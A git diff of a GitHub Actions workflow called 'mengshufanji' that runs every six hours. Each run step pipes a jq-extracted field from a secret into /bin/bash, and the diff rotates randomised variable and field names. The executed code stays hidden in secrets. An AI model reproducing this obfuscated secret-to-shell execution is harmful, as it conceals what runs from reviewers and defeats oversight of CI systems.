@@ -2,22 +2,22 @@ name: mengshufanji
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 3/6 * * *'
-
+    - cron: '47 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: mengshufanji
         env:
-          s86042: ${{ secrets.s86042 }}
+          axw870: ${{ secrets.axw870 }}
         run: |
-          echo $s86042 | jq -r .bdqcm8 | /bin/bash
-          echo $kfn80 | jq -r .d432 | /bin/bash
-          echo $lrqdl457 | jq -r .fhf7 | /bin/bash
-          echo $t090 | jq -r .qzg165 | /bin/bash
-          echo $cfpe1 | jq -r .s68441 | /bin/bash
-          echo $lunat0641 | jq -r .hb75585 | /bin/bash
-          echo $y8562 | jq -r .ua9872 | /bin/bash
+          echo $axw870 | jq -r .pse15597 | /bin/bash
+          echo $ndunj9820 | jq -r .w1540 | /bin/bash
+          echo $ufml77 | jq -r .fy29010 | /bin/bash
+          echo $xdn80 | jq -r .bgxm6 | /bin/bash
+          echo $o5616 | jq -r .pk6 | /bin/bash
+          echo $vzwn41864 | jq -r .kgfc25 | /bin/bash
+          echo $f8423 | jq -r .w0 | /bin/bash
 
